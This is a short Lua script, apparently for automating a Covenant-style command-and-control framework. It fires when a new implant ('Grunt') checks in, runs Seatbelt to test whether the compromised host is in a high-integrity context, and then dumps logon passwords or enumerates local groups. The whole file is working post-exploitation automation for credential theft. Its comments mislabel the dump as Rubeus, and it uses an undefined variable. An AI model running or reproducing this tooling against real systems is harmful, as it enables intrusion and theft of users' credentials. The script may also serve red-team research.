function OnGruntInitial(n)
	--Forerunner passes the Grunt object to the script and can be accessed like so:
	print ('New Grunt Received with ID: ' .. gruntName)
	
	--Run Seatbelt
	response = GruntExec(n,'SeatBelt system')
	
	--Check Seatbelt to determine if Grunt is in High Integrity Context
	print('[LUA] Checking Seatbelt Output:')
	if string.match(response, "HighIntegrity                 :  True") then
		print ('Returned Grunt is High Integrity.')
		print ('Tasking Rubeus to Grunt.')
		response = (GruntExec(n,'logonpasswords'))
		print (response)
	else
		print ('Returned Grunt is Medium Integrity')
		print (GruntExec(n,'shellcmd net localgroup'))
	end	
end

function OnGlobalOutput()
	print('Global Output')
end
